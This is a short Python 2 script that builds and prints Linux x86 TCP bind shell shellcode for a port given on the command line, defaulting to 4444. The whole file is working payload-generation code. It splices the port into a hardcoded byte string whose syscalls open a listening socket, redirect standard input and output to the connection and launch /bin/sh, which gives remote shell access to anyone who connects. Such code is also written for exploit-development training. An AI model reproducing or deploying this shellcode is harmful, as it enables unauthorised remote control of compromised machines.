#!/usr/bin/env python

import sys, socket;

if (len(sys.argv) == 1):
    port = 4444
else:
    port = int(sys.argv[1])

if port < 1024 or port > 65535:
    print "[!] invalid TCP port number: " + str(port)
    sys.exit(-1)

no_port = socket.htons(port);
hex_no_port = hex(no_port)

h1 = hex_no_port[2:4]
h2 = hex_no_port[4:6]

if h1 == "":
    h1 = "00"

if len(h1) == 1:
    h1 = "0" + h1

if h2 == "":
    h2 = "00"

if len(h2) == 1:
    h2 = "0" + h2

hex_port_number = "\\x%s\\x%s" % (h2, h1)

print "Creating TCP bind shell shellcode for port: " + str(port) 
print "Hex port number translation: " + hex_port_number

light_shellcode="\\x31\\xc0\\x89\\xc3\\x89\\xc1\\x89\\xc2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xc9\\x51\\x66\\x68" + hex_port_number + "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc9\\x31\\xc0\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x51\\x89\\xce\\x89\\xe1\\x89\\xe2\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80";

print light_shellcode

